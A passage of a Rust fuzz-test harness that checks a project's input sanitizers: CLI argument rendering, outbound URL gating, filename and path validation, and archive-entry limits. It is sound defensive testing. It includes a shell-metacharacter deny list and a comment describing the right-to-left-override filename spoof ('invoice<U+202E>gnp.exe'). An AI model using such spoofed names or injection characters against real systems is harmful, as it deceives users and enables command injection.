//! D2.4 — shared fuzz invariants + stable-toolchain corpus replay.
//!
//! Spec: §18.5 (fuzz media metadata parsers and output schemas, hostile
//! filenames and symlinks, shell metacharacters in PLAUD search/display
//! fields), §16.2 rows "Arbitrary command execution" and
//! "Malicious audio decoder input", §18.6A (hostile cases per cluster),
//! App. B.7 (defensive bounds + fuzz tests on untrusted input parsers).
//!
//! # How this file is used twice
//!
//! This file has two consumers and is written to compile under both:
//!
//! 1. `cargo test -p plaudon-security --test fuzz_corpus_replay` — the normal
//!    integration test. The `#[cfg(test)] mod replay` harness at the bottom
//!    feeds every file in `tests/fixtures/fuzz-corpus/<target>/` through the
//!    corresponding [`checks`] function and asserts the invariants. This runs
//!    on stable, on every PR, without cargo-fuzz installed, and turns every
//!    fixed crash into a permanent regression test.
//!
//! 2. `fuzz/fuzz_targets/fuzz_*.rs` — each libFuzzer target pulls this file in
//!    with `#[path = "../../crates/security/tests/fuzz_corpus_replay.rs"] mod
//!    replay;` and calls exactly one `replay::checks::check_*` function. The
//!    `#[cfg(test)]` harness is stripped in that build, so the fuzzer and the
//!    replay test execute byte-for-byte identical check code and assert
//!    identical invariants.
//!
//! The fuzz package lives outside the cargo workspace (`exclude = ["fuzz"]`),
//! so it cannot `use` a `#[cfg(test)]` item from the library; hoisting the
//! checks into a file both sides can include is what keeps the two in sync.
//! Consequences of the arrangement, respected throughout:
//!
//! * [`checks`] must only use `plaudon-security`'s public API, `std`, and
//!   dependencies declared by **both** `crates/security` (dev) and
//!   `fuzz/Cargo.toml` (`tempfile`).
//! * no inner attribute other than doc comments may appear in this file
//!   (module files included with `#[path]` may not carry crate-level
//!   attributes).
//!
//! # Failure signal
//!
//! A violated invariant is a `panic!`/`assert!`. That is the signal libFuzzer
//! looks for, and the signal `cargo test` looks for. Unwraps in this file are
//! deliberate for the same reason.

/// Invariant checks, shared verbatim between the libFuzzer targets and the
/// corpus replay test. Every function takes raw bytes so that a corpus file is
/// interchangeable between the two drivers.
// Each libFuzzer binary calls exactly one `check_*` function, so the others —
// and the allocation meter, which only the `cargo test` build installs — are
// legitimately unused there.
#[allow(dead_code)]
pub mod checks {
    use std::ffi::OsString;
    use std::net::IpAddr;
    use std::path::{Component, Path, PathBuf};
    use std::sync::LazyLock;

    use plaudon_audio::opus::{OpusPacketDecoder, OpusStreamParams, MAX_FRAME_SAMPLES_PER_CHANNEL};
    use plaudon_diagnostics::patterns::MIN_BLOB_CHARS;
    use plaudon_diagnostics::redact::MAX_SCAN_BYTES;
    use plaudon_diagnostics::Redactor;
    use plaudon_domain::error::{AppErrorCode, ErrorEnvelope, Redactor as DomainRedactor};
    use plaudon_domain::ids::DiagnosticId;
    use plaudon_security::error::{SecurityError, EGRESS_DENIED};
    use plaudon_security::fsguard::{
        canonicalize_and_validate, check_component, is_invisible_or_bidi, is_windows_device_name,
        sanitize_filename, validate_archive_entry, validate_relative, ArchiveEntryKind,
        ArchiveEntryMeta, ArchivePolicy, PathPolicy, DEFAULT_MAX_COMPONENT_LEN, MAX_DISPLAY_CHARS,
        MAX_EXTENSION_BYTES, MAX_ON_DISK_BYTES, WINDOWS_RESERVED_CHARS,
    };
    use plaudon_security::outbound::subprocess::{ArgError, CliArg, MAX_ARG_LEN};
    use plaudon_security::outbound::Destination;
    use plaudon_security::response::{assert_no_secret_in_response, secret_shape_of, SecretShape};

    /// Upper bound on the input we feed a parser. Corpus files are far smaller;
    /// this only stops a pathological libFuzzer input from making the *harness*
    /// (not the parser) the slow part.
    pub const MAX_INPUT_BYTES: usize = 1 << 20;

    /// Characters a POSIX shell or `cmd.exe` would treat as syntax rather than
    /// data. None of these may appear in an argument rendered from untrusted
    /// text (§16.2 "Arbitrary command execution").
    pub const SHELL_METACHARACTERS: &[char] = &[
        ';', '|', '&', '$', '>', '<', '`', '"', '\'', '(', ')', '{', '}', '[', ']', '*', '?', '!',
        '~', '^', '%', '#', '\\', '\n', '\r', '\0',
    ];

    /// Bidirectional and invisible formatting characters. A filename containing
    /// one of these can render as something other than what it is (the
    /// `invoice<U+202E>gnp.exe` trick), so sanitized names must not keep them.
    pub const BIDI_AND_INVISIBLE: &[char] = &[
        '\u{200b}', '\u{200c}', '\u{200d}', '\u{200e}', '\u{200f}', '\u{202a}', '\u{202b}',
        '\u{202c}', '\u{202d}', '\u{202e}', '\u{2066}', '\u{2067}', '\u{2068}', '\u{2069}',
        '\u{feff}',
    ];

    /// Longest single path component accepted by APFS, ext4 and NTFS. A
    /// sanitized filename must fit, otherwise the write fails at a layer that
    /// cannot explain itself to the user.
    pub const MAX_FILENAME_BYTES: usize = 255;

    /// Reserved Windows device names, with or without an extension and
    /// case-insensitively.
    ///
    /// This is an *independent* oracle, deliberately not read from
    /// `fsguard::WINDOWS_DEVICE_NAMES`, so a change there has to be justified
    /// against this list rather than silently agreeing with itself. It holds
    /// exactly the names Microsoft documents as reserved on Windows NT and
    /// later. The legacy DOS/9x name `CLOCK$`, and `COM0`/`LPT0`, are
    /// deliberately **not** asserted here: a file called `CLOCK$` or `COM0`
    /// can be created on NTFS, so failing a sanitizer for keeping them would
    /// be asserting folklore. They are still carried in the corpus so the code
    /// path is exercised.
    pub const WINDOWS_RESERVED: &[&str] = &[
        "CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8",
        "COM9", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
    ];

    /// Decode fuzz bytes as text. Invalid UTF-8 becomes replacement characters
    /// rather than being discarded, because every one of these parsers takes a
    /// `&str` in production and we want the lossy forms exercised too.
    #[must_use]
    pub fn lossy(data: &[u8]) -> String {
        let bounded = &data[..data.len().min(MAX_INPUT_BYTES)];
        String::from_utf8_lossy(bounded).into_owned()
    }

    fn contains_control(s: &str) -> bool {
        s.chars().any(char::is_control)
    }

    /// Hostnames that denote this machine or a private network. Deliberately an
    /// *independent* reimplementation of the gate's own private check: if the
    /// two ever disagree, the fuzzer reports it.
    #[must_use]
    // `ends_with(".local")` on a hostname is a DNS suffix test, not a file
    // extension, and `h` is already lower-cased.
    #[allow(clippy::case_sensitive_file_extension_comparisons)]
    pub fn looks_local(host: &str) -> bool {
        let h = host.to_ascii_lowercase();
        h == "localhost"
            || h == "localhost."
            || h.ends_with(".localhost")
            || h.ends_with(".local")
            || h.ends_with(".local.")
            || h.ends_with(".internal")
            || h.ends_with(".home.arpa")
            || h.ends_with(".in-addr.arpa")
            || h.ends_with(".ip6.arpa")
    }

    /// True if `name` is a reserved Windows device name, with or without an
    /// extension (`con`, `CON.m4a`, `clock$`).
    #[must_use]
    pub fn is_windows_reserved(name: &str) -> bool {
        let stem = name.split('.').next().unwrap_or(name);
        let stem = stem.trim_end_matches([' ', '.']);
        WINDOWS_RESERVED
            .iter()
            .any(|r| r.eq_ignore_ascii_case(stem))
    }

    // ---------------------------------------------------------------------
    // Allocation ceiling
    // ---------------------------------------------------------------------

    /// Per-thread allocation meter.
    ///
    /// Honest scope: the counting allocator is only installed in the
    /// `cargo test` build of this file (see the bottom of the file). Under
    /// libFuzzer the ceiling is enforced by `-rss_limit_mb=2048`, which
    /// `scripts/fuzz.sh` always passes; in that build [`peak`] stays `0` and
    /// [`assert_allocation_bounded`] is a no-op rather than a false assurance.
    pub mod alloc_meter {
        use std::cell::Cell;

        thread_local! {
            static METERING: Cell<bool> = const { Cell::new(false) };
            static LIVE: Cell<usize> = const { Cell::new(0) };
            static PEAK: Cell<usize> = const { Cell::new(0) };
        }

        /// Start metering on this thread and zero the counters.
        pub fn start() {
            LIVE.with(|c| c.set(0));
            PEAK.with(|c| c.set(0));
            METERING.with(|c| c.set(true));
        }

        /// Stop metering on this thread and return the peak live bytes seen.
        pub fn stop() -> usize {
            METERING.with(|c| c.set(false));
            PEAK.with(Cell::get)
        }

        /// Peak live bytes observed since [`start`]. `0` when no counting
        /// allocator is installed.
        #[must_use]
        pub fn peak() -> usize {
            PEAK.with(Cell::get)
        }

        /// Called by the counting allocator. Cheap and allocation-free: the
        /// thread-locals are const-initialized and have no destructor, so this
        /// cannot re-enter the allocator.
        #[allow(dead_code)] // only reached via the counting allocator, which is
                            // installed in the `cargo test` build of this file.
        pub(crate) fn on_alloc(size: usize) {
            if METERING.with(Cell::get) {
                let live = LIVE.with(|c| {
                    let next = c.get().saturating_add(size);
                    c.set(next);
                    next
                });
                PEAK.with(|c| {
                    if live > c.get() {
                        c.set(live);
                    }
                });
            }
        }

        /// Called by the counting allocator.
        #[allow(dead_code)] // see `on_alloc`.
        pub(crate) fn on_dealloc(size: usize) {
            if METERING.with(Cell::get) {
                LIVE.with(|c| c.set(c.get().saturating_sub(size)));
            }
        }
    }

    /// Allocation ceiling for a single parse: a fixed working-set allowance
    /// plus a bounded multiple of the input. A parser that allocates from a
    /// declared/attacker-controlled length rather than from the bytes actually
    /// present will blow through this.
    #[must_use]
    pub fn allocation_ceiling(input_len: usize) -> usize {
        (16 << 20) + input_len.saturating_mul(64)
    }

    fn assert_allocation_bounded(what: &str, input_len: usize) {
        let peak = alloc_meter::peak();
        let ceiling = allocation_ceiling(input_len);
        assert!(
            peak <= ceiling,
            "{what}: peak allocation {peak} B exceeded the ceiling {ceiling} B for a \
             {input_len} B input (unbounded allocation from untrusted length)"
        );
    }

    // ---------------------------------------------------------------------
    // fuzz_cli_arg_render
    // ---------------------------------------------------------------------

    /// §16.2 "Arbitrary command execution", §7.1, §18.5 (shell metacharacters
    /// in PLAUD search/display fields).
    ///
    /// The whole input is treated as one hostile argument value — a recording
    /// title, a search term, a cursor returned by the CLI, an export path.
    ///
    /// Invariants:
    /// * `render` never panics for any input;
    /// * an accepted [`CliArg::Identifier`] renders to exactly its input, never
    ///   starts with `-`, and contains no control character, NUL, whitespace or
    ///   shell metacharacter;
    /// * a relative [`CliArg::Path`] is always rejected;
    /// * an accepted [`CliArg::Path`] renders to exactly its input (one
    ///   argument, no splitting, no quoting, no expansion), stays absolute and
    ///   so can never be read as a flag, and contains no control character or
    ///   NUL;
    /// * rendering an argument vector yields exactly as many `OsString`s as
    ///   there were `CliArg`s — untrusted text can never add an argument.
    ///
    /// Honest note on `CliArg::Path`: the shell-metacharacter invariant is
    /// asserted for `Identifier`, which is the only channel untrusted text may
    /// enter through, and not for `Path`. A path is passed to
    /// `std::process::Command` as a single `argv` element with no shell, no
    /// `cmd.exe` and no string concatenation anywhere in
    /// `outbound::subprocess`, so `;` or `$(…)` inside a legitimate user
    /// directory name is data, not syntax. What matters for `Path` — and what
    /// is asserted here — is that it is absolute, is not split, and is not
    /// mistakable for a flag.
    // One straight-line list of invariants is easier to audit against the §16.2
    // "Arbitrary command execution" row than the same assertions split up.
    #[allow(clippy::too_many_lines)]
    pub fn check_cli_arg_render(data: &[u8]) {
        let input_len = data.len();
        let s = lossy(data);

        alloc_meter::start();

        // 1. Identifier: the untrusted-text channel.
        match CliArg::Identifier(s.clone()).render() {
            Ok(rendered) => {
                let text = rendered
                    .to_str()
                    .expect("an accepted identifier is ASCII and must render to UTF-8");
                assert_eq!(text, s, "render must not rewrite an accepted identifier");
                assert!(!text.starts_with('-'), "flag injection accepted: {text:?}");
                assert!(
                    !contains_control(text),
                    "control character accepted: {text:?}"
                );
                assert!(!text.contains('\0'), "NUL accepted: {text:?}");
                assert!(
                    !text.chars().any(|c| SHELL_METACHARACTERS.contains(&c)),
                    "shell metacharacter accepted: {text:?}"
                );
                assert!(
                    !text.chars().any(char::is_whitespace),
                    "whitespace would split into extra arguments on a naive shell: {text:?}"
                );
                assert!(
                    text.len() <= MAX_ARG_LEN,
                    "argument exceeds the length cap: {}",
                    text.len()
                );
                assert!(
                    text.chars()
                        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | ':' | '-')),
                    "identifier charset escaped: {text:?}"
                );
            }
            Err(err) => {
                // Rejection must be typed and explicable, never a panic.
                assert!(!err.to_string().is_empty(), "ArgError must describe itself");
            }
        }

        // 2. A relative path must always be refused, so a hostile "path" can
        //    never be resolved against the child process's working directory.
        let relative = PathBuf::from(&s);
        if !relative.is_absolute() {
            assert_eq!(
                CliArg::Path(relative.clone()).render(),
                Err(ArgError::RelativePath),
                "relative path accepted: {}",
                relative.display()
            );
        }

        // 3. The same bytes as a component of an absolute path.
        let absolute = absolute_candidate(&s);
        if absolute.is_absolute() {
            match CliArg::Path(absolute.clone()).render() {
                Ok(rendered) => {
                    let text = rendered
                        .to_str()
                        .expect("path built from a String is UTF-8");
                    let expected = absolute
                        .to_str()
                        .expect("path built from a String is UTF-8");
                    assert_eq!(text, expected, "render must not rewrite or split a path");
                    assert!(
                        Path::new(text).is_absolute(),
                        "accepted path is not absolute: {text:?}"
                    );
                    assert!(!text.starts_with('-'), "path renders as a flag: {text:?}");
                    assert!(
                        !contains_control(text),
                        "control character in path: {text:?}"
                    );
                    assert!(!text.contains('\0'), "NUL in path: {text:?}");
                }
                Err(err) => {
                    assert!(!err.to_string().is_empty(), "ArgError must describe itself");
                }
            }
        }

        // 4. Fixed-vocabulary and numeric arguments are always renderable and
        //    always inert.
        let literal = CliArg::Literal("list")
            .render()
            .expect("literal always renders");
        assert_eq!(literal, OsString::from("list"));
        #[allow(clippy::cast_possible_wrap)]
        let n = i64::try_from(input_len).unwrap_or(i64::MAX);
        for number in [
            CliArg::Number(n),
            CliArg::Number(i64::MIN),
            CliArg::Number(-1),
        ] {
            let out = number.render().expect("numbers always render");
            let text = out.to_str().expect("digits are UTF-8");
            assert!(
                text.chars().all(|c| c.is_ascii_digit() || c == '-'),
                "number rendered as {text:?}"
            );
            assert!(!text.chars().any(|c| SHELL_METACHARACTERS.contains(&c)));
        }

        // 5. Argument-vector arity: an accepted hostile value occupies exactly
        //    one slot and adds no flags of its own.
        let argv = [
            CliArg::Literal("download"),
            CliArg::Identifier(s.clone()),
            CliArg::Literal("--output"),
            CliArg::Path(absolute),
        ];
        let rendered: Vec<OsString> = argv.iter().filter_map(|a| a.render().ok()).collect();
        assert!(
            rendered.len() <= argv.len(),
            "rendering produced more arguments than were supplied"
        );
        let flags = rendered
            .iter()
            .filter(|a| a.to_string_lossy().starts_with('-'))
            .count();
        assert!(
            flags <= 1,
            "untrusted input introduced an extra flag: {rendered:?}"
        );

        // The display/search-field boundary for the same hostile string
        // (§18.5: "inject shell metacharacters into PLAUD search/display
        // fields") is validated in `plaudon_app::validate`, which this crate
        // cannot call — `plaudon-app` depends on `plaudon-security`, not the
        // other way round — and which carries its own unit tests. What is
        // asserted here is the layer `plaudon-security` actually owns: nothing
        // that reaches `CliArg` can introduce shell syntax or an extra flag.

        alloc_meter::stop();
        assert_allocation_bounded("cli_arg_render", input_len);
    }

    /// Build an absolute path whose *last component* is the fuzz input, without
    /// touching the filesystem. If the input is itself absolute it is used
    /// as-is, so absolute-path corpus entries stay meaningful.
    fn absolute_candidate(s: &str) -> PathBuf {
        let raw = PathBuf::from(s);
        if raw.is_absolute() {
            return raw;
        }
        std::env::temp_dir().join("plaudon-fuzz-root").join(raw)
    }

    // ---------------------------------------------------------------------
    // fuzz_destination_url
    // ---------------------------------------------------------------------

    /// §7.3, §16.2 "SSRF via redirect" and "Signed URL leak", §18.5.
    ///
    /// Invariants:
    /// * `Destination::url` never panics;
    /// * an `Ok` result is always an `https` network destination, never an IP
    ///   literal, never loopback/private/link-local, host lower-cased and free
    ///   of userinfo;
    /// * `label()` is `scheme://host:port` only — never a `@`, `?`, `#` or any
    ///   path segment, so a signed URL can never reach a log or an error
    ///   envelope;
    /// * a denial carries the stable `EGRESS_DENIED` code and a label that is
    ///   equally free of credentials and of log-injection bytes.
    pub fn check_destination_url(data: &[u8]) {
        let input_len = data.len();
        let raw = lossy(data);

        alloc_meter::start();

        match Destination::url(&raw) {
            Ok(dest) => {
                let Destination::Network { scheme, host, port } = &dest else {
                    panic!("Destination::url must yield a Network destination, got {dest:?}")
                };
                assert_eq!(
                    scheme, "https",
                    "non-https destination accepted from {raw:?}"
                );
                assert!(!host.is_empty(), "empty host accepted from {raw:?}");
                assert!(
                    host.parse::<IpAddr>().is_err(),
                    "IP literal accepted as a vendor host: {host:?}"
                );
                assert!(
                    !looks_local(host),
                    "loopback/private host accepted: {host:?}"
                );
                assert_eq!(
                    *host,
                    host.to_ascii_lowercase(),
                    "host not normalized: {host:?}"
                );
                assert!(
                    !host.contains('@'),
                    "userinfo survived into the host: {host:?}"
                );
                assert!(!host.contains('/'), "path survived into the host: {host:?}");
                assert!(
                    !host.contains(':'),
                    "port or scheme survived into the host: {host:?}"
                );
                assert!(
                    !contains_control(host),
                    "control character in host: {host:?}"
                );
                assert!(*port > 0, "port 0 accepted from {raw:?}");

                let label = dest.label();
                assert_label_safe(&label, &raw);
                let prefix = "https://";
                let authority = label
                    .strip_prefix(prefix)
                    .unwrap_or_else(|| panic!("label must start with {prefix}: {label:?}"));
                assert!(
                    !authority.contains('/'),
                    "label leaked a path segment: {label:?}"
                );
                assert_eq!(
                    authority,
                    format!("{host}:{port}"),
                    "label is not host:port"
                );
            }
            Err(denied) => {
                assert_label_safe(&denied.destination_label, &raw);
                let parts = denied.envelope_parts();
                assert_eq!(parts.code, EGRESS_DENIED, "denial must use the stable code");
                assert!(!parts.message.is_empty(), "denial must explain itself");
                assert!(
                    !parts.message.contains(&raw) || raw.is_empty(),
                    "denial message echoed the raw URL: {:?}",
                    parts.message
                );
            }
        }

        alloc_meter::stop();
        assert_allocation_bounded("destination_url", input_len);
    }

    /// A destination label is log- and envelope-safe: no credentials, no query
    /// string, no fragment, no newline for log injection.
    fn assert_label_safe(label: &str, raw: &str) {
        for bad in ['@', '?', '#', '\n', '\r', '\0'] {
            assert!(
                !label.contains(bad),
                "destination label {label:?} contains {bad:?} (from {raw:?})"
            );
        }
        assert!(
            !contains_control(label),
            "destination label contains a control character: {label:?}"
        );
    }

    // ---------------------------------------------------------------------
    // fuzz_path_validation
    // ---------------------------------------------------------------------

    /// A private, canonicalized directory used as the only permitted root.
    /// Created once per process and kept alive for its whole lifetime; nothing
    /// is ever written into it by the check itself, so the fuzzer stays fast
    /// and side-effect free.
    static FUZZ_ROOT: LazyLock<(tempfile::TempDir, PathBuf)> = LazyLock::new(|| {
        let dir = tempfile::Builder::new()
            .prefix("plaudon-fuzz-root")
            .tempdir()
            .expect("a private temp root must be creatable");
        let canonical = dir
            .path()
            .canonicalize()
            .expect("temp root must canonicalize");
        (dir, canonical)
    });

    /// The canonical path of [`FUZZ_ROOT`].
    pub fn fuzz_root() -> &'static Path {
        FUZZ_ROOT.1.as_path()
    }

    /// §16.5, §13.4, §18.5 (hostile filenames and symlinks), App. A.4.
    ///
    /// Invariants for [`sanitize_filename`]:
    /// * never panics;
    /// * `on_disk()` is non-empty, within [`MAX_ON_DISK_BYTES`], free of
    ///   control characters, NUL, bidi/invisible formatting characters, path
    ///   separators and Windows-reserved characters, is not a Windows device
    ///   name, is not `.` or `..`, and has no trailing space or dot;
    /// * `display()` is non-empty, within [`MAX_DISPLAY_CHARS`] characters and
    ///   carries no control or bidi character that could spoof what the user
    ///   sees;
    /// * sanitization is deterministic and is a fixed point — re-sanitizing an
    ///   already sanitized name returns it unchanged, so a staged file cannot
    ///   drift on a second import.
    ///
    /// Invariants for [`canonicalize_and_validate`]:
    /// * never panics;
    /// * an accepted path is absolute, lies inside the permitted root, and has
    ///   no `..` component left in it;
    /// * a rejection carries a stable, loggable rule name.
    // One straight-line list of invariants is easier to audit against §16.5 and
    // §18.5 than the same assertions scattered over helper functions.
    #[allow(clippy::too_many_lines)]
    pub fn check_path_validation(data: &[u8]) {
        let input_len = data.len();
        let s = lossy(data);

        alloc_meter::start();
        let sanitized = sanitize_filename(&s);
        alloc_meter::stop();
        assert_allocation_bounded("sanitize_filename", input_len);

        let on_disk = sanitized.on_disk();
        assert!(!on_disk.is_empty(), "sanitized name is empty for {s:?}");
        assert!(
            on_disk.len() <= MAX_ON_DISK_BYTES,
            "sanitized name is {} B, over the {MAX_ON_DISK_BYTES} B budget",
            on_disk.len()
        );
        assert!(
            on_disk.len() <= MAX_FILENAME_BYTES,
            "sanitized name is {} B, over what APFS/ext4/NTFS accept for one component",
            on_disk.len()
        );
        assert!(
            !on_disk.chars().any(char::is_control),
            "control character in {on_disk:?}"
        );
        assert!(!on_disk.contains('\0'), "NUL in {on_disk:?}");
        assert!(
            !on_disk.chars().any(is_invisible_or_bidi),
            "bidi/invisible character survived into {on_disk:?}"
        );
        assert!(
            !on_disk.chars().any(|c| BIDI_AND_INVISIBLE.contains(&c)),
            "bidi/invisible character survived into {on_disk:?}"
        );
        assert!(!on_disk.contains('/'), "path separator in {on_disk:?}");
        assert!(!on_disk.contains('\\'), "path separator in {on_disk:?}");
        assert!(
            !on_disk.chars().any(|c| WINDOWS_RESERVED_CHARS.contains(&c)),
            "Windows-reserved character in {on_disk:?}"
        );
        assert!(
            !is_windows_device_name(on_disk),
            "Windows device name produced: {on_disk:?}"
        );
        assert!(
            !is_windows_reserved(on_disk),
            "Windows device name produced: {on_disk:?}"
        );
        assert!(
            on_disk != "." && on_disk != "..",
            "dot name produced from {s:?}"
        );
        assert!(!on_disk.ends_with(' '), "trailing space in {on_disk:?}");
        assert!(!on_disk.ends_with('.'), "trailing dot in {on_disk:?}");

        let display = sanitized.display();
        assert!(!display.is_empty(), "display name is empty for {s:?}");
        assert!(
            display.chars().count() <= MAX_DISPLAY_CHARS,
            "display name is {} chars, over the {MAX_DISPLAY_CHARS} budget",
            display.chars().count()
        );
        assert!(
            !display.chars().any(char::is_control),
            "control character in display {display:?}"
        );
        assert!(
            !display.chars().any(is_invisible_or_bidi),
            "bidi/invisible character in display {display:?}"
        );

        assert_eq!(
            sanitize_filename(&s).on_disk(),
            on_disk,
            "sanitization is not deterministic"
        );
        assert_eq!(
            sanitize_filename(on_disk).on_disk(),
            on_disk,
            "sanitization is not a fixed point for {on_disk:?}"
        );

        if let Some(ext) = sanitized.extension() {
            assert!(
                ext.len() <= MAX_EXTENSION_BYTES,
                "extension {ext:?} is over the {MAX_EXTENSION_BYTES} B budget"
            );
            assert!(
                !ext.contains('.'),
                "extension still contains a dot: {ext:?}"
            );
            assert!(
                !ext.contains('/') && !ext.contains('\\'),
                "separator in extension {ext:?}"
            );
        }

        // The sanitized name must be a legal component inside the root.
        let root = fuzz_root();
        let policy = PathPolicy::for_roots([root.to_path_buf()]);
        check_component(on_disk, DEFAULT_MAX_COMPONENT_LEN)
            .unwrap_or_else(|e| panic!("sanitized name {on_disk:?} is not a legal component: {e}"));

        alloc_meter::start();
        let verdict = canonicalize_and_validate(&policy, Path::new(&s));
        alloc_meter::stop();
        assert_allocation_bounded("canonicalize_and_validate", input_len);

        match verdict {
            Ok(validated) => {
                let path = validated.as_path();
                assert!(
                    path.is_absolute(),
                    "accepted path is not absolute: {}",
                    path.display()
                );
                assert!(
                    path.starts_with(root),
                    "accepted path {} escaped the permitted root {} (input {s:?})",
                    path.display(),
                    root.display()
                );
                assert!(
                    !path.components().any(|c| matches!(c, Component::ParentDir)),
                    "accepted path still contains a parent component: {}",
                    path.display()
                );
                let text = path.to_string_lossy();
                assert!(
                    !text.contains('\0'),
                    "accepted path contains NUL: {}",
                    path.display()
                );
            }
            Err(err) => {
                assert!(
                    !err.reason().rule().is_empty(),
                    "rejection without a stable rule name"
                );
                if let Some(detail) = err.detail() {
                    assert!(
                        !detail.chars().any(char::is_control),
                        "rejection detail is not log-safe: {detail:?}"
                    );
                }
            }
        }

        // A relative candidate must resolve inside the root or be refused; it
        // must never resolve against the process working directory.
        match validate_relative(&policy, &s) {
            Ok(relative) => {
                assert!(
                    !relative.is_absolute(),
                    "validate_relative returned an absolute path"
                );
                assert!(
                    !relative
                        .components()
                        .any(|c| matches!(c, Component::ParentDir)),
                    "validated relative path keeps a parent component: {}",
                    relative.display()
                );
                assert!(
                    root.join(&relative).starts_with(root),
                    "validated relative path escapes the root: {}",
                    relative.display()
                );
            }
            Err(err) => assert!(
                !err.reason().rule().is_empty(),
                "rejection without a rule name"
            ),
        }
    }

    // ---------------------------------------------------------------------
    // fuzz_archive_entry
    // ---------------------------------------------------------------------

    /// Per-entry caps used by the fuzz target and the replay. They are smaller
    /// than the production defaults so that a corpus file can actually reach
    /// them without carrying gigabytes.
    pub const FUZZ_MAX_ENTRY_BYTES: u64 = 1 << 30;
    /// Cumulative declared-size cap for one fuzzed archive.
    pub const FUZZ_MAX_TOTAL_BYTES: u64 = 4 << 30;
    /// Entry-count cap for one fuzzed archive.
    pub const FUZZ_MAX_ENTRIES: usize = 1000;
    /// Uncompressed:compressed ratio cap for one fuzzed archive.
    pub const FUZZ_MAX_RATIO: u64 = 100;
    /// Entries below this declared size are not ratio-checked.
    pub const FUZZ_RATIO_MIN_BYTES: u64 = 1 << 20;

    /// Decode the entry stream. One entry is
    /// `u8 path_len | path_len bytes of path | u8 kind | u32le declared | u32le compressed`,
    /// repeated until the input is exhausted; a truncated trailing record ends
    /// the stream. A hand-written decoder keeps a corpus file byte-identical
    /// between the libFuzzer driver and the replay test.
    fn decode_archive_entries(data: &[u8]) -> Vec<ArchiveEntryMeta> {
        let mut out = Vec::new();
        let mut at = 0usize;
        while at < data.len() && out.len() < 4096 {
            let len = usize::from(data[at]);
            at += 1;
            if at + len + 9 > data.len() {
                break;
            }
            let path = String::from_utf8_lossy(&data[at..at + len]).into_owned();
            at += len;
            let kind = match data[at] % 9 {
                0 => ArchiveEntryKind::File,
                1 => ArchiveEntryKind::Symlink,
                2 => ArchiveEntryKind::Directory,
                3 => ArchiveEntryKind::HardLink,
                4 => ArchiveEntryKind::CharacterDevice,
                5 => ArchiveEntryKind::BlockDevice,
                6 => ArchiveEntryKind::Fifo,
                7 => ArchiveEntryKind::Socket,
                _ => ArchiveEntryKind::Unknown,
            };
            at += 1;
            let declared = u64::from(u32::from_le_bytes([
                data[at],
                data[at + 1],
                data[at + 2],
                data[at + 3],
            ]));
            let compressed = u64::from(u32::from_le_bytes([
                data[at + 4],
                data[at + 5],
                data[at + 6],
                data[at + 7],
            ]));
            at += 8;
            let mut entry = match kind {
                ArchiveEntryKind::File => ArchiveEntryMeta::file(path, declared, compressed),
                ArchiveEntryKind::Directory => ArchiveEntryMeta::directory(path),
                other => ArchiveEntryMeta::of_kind(path, other),
            };
            entry.declared_uncompressed_size = declared;
            entry.compressed_size = compressed;
            out.push(entry);
        }
        out
    }

    /// §13.5, §13.6, §18.5 (fuzz malicious backup bundles), §18.6A "Portable
    /// backup" cluster (traversal, symlink, duplicate entry, resource abuse).
    ///
    /// Invariants:
    /// * `validate_archive_entry` never panics on any entry stream;
    /// * an accepted entry has a relative, `..`-free path that stays inside the
    ///   destination root once joined;
    /// * only regular files and directories are ever accepted — never a
    ///   symlink, hard link, device, fifo, socket or unclassified entry;
    /// * no duplicate key is accepted twice, so a second entry can never
    ///   overwrite the bytes of the first;
    /// * the per-entry size cap, the cumulative size cap, the entry-count cap
    ///   and the compression-ratio cap all hold for the accepted set, so a
    ///   forged declared size cannot drive an unbounded extraction.
    // One straight-line list of invariants is easier to audit against the
    // §18.6A "Portable backup" row than the same assertions split up.
    #[allow(clippy::too_many_lines)]
    pub fn check_archive_entry(data: &[u8]) {
        let input_len = data.len();
        let root = fuzz_root();
        let mut policy = ArchivePolicy::new(root.to_path_buf())
            .with_max_entry_bytes(FUZZ_MAX_ENTRY_BYTES)
            .with_max_total_bytes(FUZZ_MAX_TOTAL_BYTES)
            .with_max_entries(FUZZ_MAX_ENTRIES)
            .with_max_compression_ratio(FUZZ_MAX_RATIO)
            .with_ratio_check_min_bytes(FUZZ_RATIO_MIN_BYTES);

        let entries = decode_archive_entries(data);

        alloc_meter::start();
        let mut accepted_keys: Vec<String> = Vec::new();
        let mut accepted_total: u64 = 0;
        for entry in &entries {
            match validate_archive_entry(entry, &mut policy) {
                Ok(valid) => {
                    let relative = valid.relative_path();
                    assert!(
                        !relative.as_os_str().is_empty(),
                        "accepted an empty entry path"
                    );
                    assert!(
                        relative.is_relative(),
                        "accepted an absolute entry path: {} (declared {:?})",
                        relative.display(),
                        entry.path
                    );
                    assert!(
                        !relative
                            .components()
                            .any(|c| matches!(c, Component::ParentDir)),
                        "accepted a traversal entry: {} (declared {:?})",
                        relative.display(),
                        entry.path
                    );
                    assert!(
                        !relative
                            .components()
                            .any(|c| matches!(c, Component::RootDir)),
                        "accepted a rooted entry: {}",
                        relative.display()
                    );
                    let joined = root.join(relative);
                    assert!(
                        joined.starts_with(root),
                        "accepted entry {} normalizes outside the destination root",
                        relative.display()
                    );
                    assert!(
                        valid.kind().is_extractable(),
                        "accepted a non-extractable entry kind: {:?}",
                        valid.kind()
                    );

                    let key = valid.duplicate_key().to_owned();
                    assert!(
                        !accepted_keys.contains(&key),
                        "duplicate entry accepted twice: {key:?} (declared {:?})",
                        entry.path
                    );
                    accepted_keys.push(key);

                    // Size, ratio and cumulative caps apply to the entries that
                    // actually produce bytes. A directory entry carries no
                    // payload, so a forged size on one must be ignored rather
                    // than counted — that is itself an invariant worth holding.
                    let size = valid.declared_uncompressed_size();
                    if valid.kind() == ArchiveEntryKind::File {
                        assert!(
                            size <= FUZZ_MAX_ENTRY_BYTES,
                            "accepted entry declaring {size} B, over the per-entry cap"
                        );
                        accepted_total = accepted_total.saturating_add(size);
                        assert!(
                            accepted_total <= FUZZ_MAX_TOTAL_BYTES,
                            "accepted set declares {accepted_total} B, over the archive cap"
                        );
                        if size >= FUZZ_RATIO_MIN_BYTES && entry.compressed_size > 0 {
                            let ratio = size / entry.compressed_size;
                            assert!(
                                ratio <= FUZZ_MAX_RATIO,
                                "accepted a {ratio}:1 decompression bomb ({size} B from {} B)",
                                entry.compressed_size
                            );
                        }
